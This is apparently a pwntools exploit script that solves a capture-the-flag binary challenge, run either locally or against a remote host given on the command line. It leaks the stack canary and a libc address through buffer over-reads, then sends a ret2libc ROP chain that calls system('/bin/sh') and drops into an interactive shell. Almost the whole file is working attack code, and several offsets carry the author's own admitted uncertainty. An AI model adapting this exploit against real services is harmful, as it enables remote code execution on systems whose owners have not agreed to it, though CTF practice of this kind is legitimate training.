from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([context.binary.path], env={'LD_PRELOAD': './libc.so.6'})

# Set the context
context.binary = './chall'
#context.terminal = ['gnome-terminal', '-e']
libc = ELF('./libc.so.6',checksec=False)

# Load the binary
elf = context.binary

# Start the process
p = start()

if args.GDB:
    gdb.attach(p, '''
    #breakrva 0x1256
    #breakrva 0x125B 
    #breakrva 0x126C
    break system
    c
    x/gx ($rsp+0x58)
    ''')


canary_offset = 80
def leak_canary():
    # Payload that reaches up to the bytes we want to leak
    to_send = b"A"*canary_offset
    p.recvuntil(b'How much???')
    p.sendline(str(len(to_send)))
    p.recvuntil(b'ok... now send content')
    # Send 8 bytes less to leak 8 byte canary
    actual_sent = to_send[:-8]
    p.sendline(actual_sent)
    #print(actual_sent)
    
    # Get the leaked data until program asks "wanna"
    leaked_data = p.recvuntil("\nwanna")
    #print(leaked_data)
    canary_data = leaked_data[73:81] # Filter the leaked canary from the rest of the output
    # Convert the bytes to an unsigned 64-bit integer and repolace last bit with 00
    canary_value = u64(canary_data) & 0xFFFFFFFFFFFFFF00
    print(hex(canary_value))
    p.recvuntil(b'again?')
    p.sendline(b'1337')  # Continue the loop
    return canary_value

canary = leak_canary()


# Figure out the libc base
p.recvuntil(b'How much???')
payload_len=102 # Up until after __libc_init_first address on stack.
p.sendline(str(payload_len))
p.recvuntil(b'ok... now send content')
payload = cyclic(canary_offset-8) # A's up until canary
payload += p64(canary+2)  # Insert the leaked canary (does not matter for now + 2 to prevent 00)
payload += b"B"*8
assert(len(payload)<=payload_len) # else the extra bytes will go to 'wanna do it again?'->fail.
p.send(payload)

leaked2 = p.recvuntil("\nwanna")
#print(leaked2)
libc_leak = u64(leaked2[89:95].ljust(8, b'\x00')) # process the leaked string and justify to properly unpack later
libc_leak -= 0x90 # leaked in 0x90 into function
print("init_leak: ", hex(libc_leak))
libc_base = libc_leak - libc.symbols['__libc_init_first'] + 0x28700 # idk why its off by 0x8700, turns out it should be like that
print("LibcBase: ", hex(libc_base))
system_addr = libc_base + libc.symbols['system'] - 0x28700

# ROP
rop = ROP([libc])
# Let's say we want to get a shell using `system("/bin/sh")`
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_base - 0x28700
ret = rop.find_gadget(['ret'])[0] + libc_base - 0x28700
bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base - 0x28700
exit_addr = libc.symbols['exit'] + libc_base - 0x28700

rop.raw([ret, pop_rdi, bin_sh, system_addr, exit_addr]) # Raw bcs of *((_BYTE *)&nbytes + (unsigned int)nbytes + 4) = 0; start or end? idk 0x00007fe6f31baafd
print(rop.dump())

# Send the payload
print("REACHED ACUAL EXPLOIT PAYLOAD")
p.recvuntil(b'again?')
p.sendline(b'1337')  # Continue the loop
p.recvuntil(b'How much???')
payload = cyclic(canary_offset-8) # A's up until canary
payload += p64(canary)  # Insert the leaked canary
payload += cyclic(8) # overwrite rbp
payload += rop.chain()
payload_len=len(payload)
p.sendline(str(payload_len).encode())
p.recvuntil(b'ok... now send content')
p.send(payload)
print("FINAL PAYLOAD SENT!!!!!!!!!!!!!!!!")

# Interact with the process
p.interactive()
